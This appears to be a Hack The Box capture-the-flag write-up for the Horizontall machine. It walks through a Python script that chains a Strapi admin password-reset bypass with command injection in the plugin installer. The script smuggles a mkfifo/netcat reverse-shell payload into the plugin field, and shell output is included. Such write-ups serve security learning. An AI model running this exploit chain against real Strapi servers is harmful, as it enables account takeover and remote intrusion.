# Hack The Box. Machines. Horizontall

Machine write-up: https://7rocky.github.io/en/htb/horizontall

### `rce_strapi.py`

This Python script is based on two exploits for Strapi:

- [CVE-2019-18818](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18818): This exploit allows to reset the password of a user inside Strapi providing its email address.
- [CVE-2019-19069](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19609): This exploit obtains Remote Command Execution (RCE) provided access to the administration panel.

There is a Python script for the first CVE that can be found [here](https://thatsn0tmysite.wordpress.com/2019/11/15/x05/). For the second CVE, there is a manual proof of concept in [this blog](https://bittherapy.net/post/strapi-framework-remote-code-execution/).

To compromise machine [Horizontall](https://7rocky.github.io/en/htb/horizontall), the purpose is to gain RCE with Strapi, but we do not have credentials for user `admin`. However, using the first exploit, we are able to reset its password and login as `admin`. Then, we will be able to run the second exploit and gain RCE.

The first exploit follows these steps:

- Show that Strapi version is 3.0.0-beta.17.x:

```python
s = requests.session()
version = json.loads(s.get(f'{url}/admin/strapiVersion').text)['strapiVersion']
print(f'[*] Detected version (GET /admin/strapiVersion): {version}')
```

- Send the reset password request for the provided email:

```python
print('[*] Sending password reset request...')
s.post(f'{url}', json={
    'email': email,
    'url': f'{url}/admin/plugins/users-permissions/auth/reset-password'
})
```

- Set the new password (here is the point where Strapi forgets to check the verification code to reset the password):

```python
print('[*] Setting new password...')
r = s.post(f'{url}/admin/auth/reset-password', json={
    'code': {}, 'password': new_password, 'passwordConfirmation': new_password
})
```

- Obtain a JWT token that shows that we are logged in as the wanted user (this time, as `admin@horizontall.htb`):

```python
print('[*] Response:', r.text)
token = r.json()['jwt']
```

The second exploit simply makes a POST request to Strapi in order to install/uninstall a plugin. However, the handler is vulnerable to command injection, so here we can get RCE (this time, we use a payload to send a reverse shell):

```python
command = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'

s.post(f'{url}/admin/plugins/install',
        headers={'Authorization': f'Bearer {token}'},
        data={'plugin': f'documentation && $({command})'})
```

Finally, we can run the exploit and get access to the machine as user `strapi` using `nc`:

```console
$ python3 rce_strapi.py 10.10.17.44 4444
[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
[*] Sending password reset request...
[*] Setting new password...
[*] Response: {"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMTg5ODcyLCJleHAiOjE2MzI3ODE4NzJ9.4_HRMhnzA9CEcw6-p2uCOKJWTxpRkCiMaWiNfGDWKRc","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}
```

```console
$ nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.105.
Ncat: Connection from 10.10.11.105:40764.
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
strapi@horizontall:~/myapi$
```

**Note:** The previous code snippets are shown only as an explanation, the complete source code is a bit different due to some global variables and imported libraries.
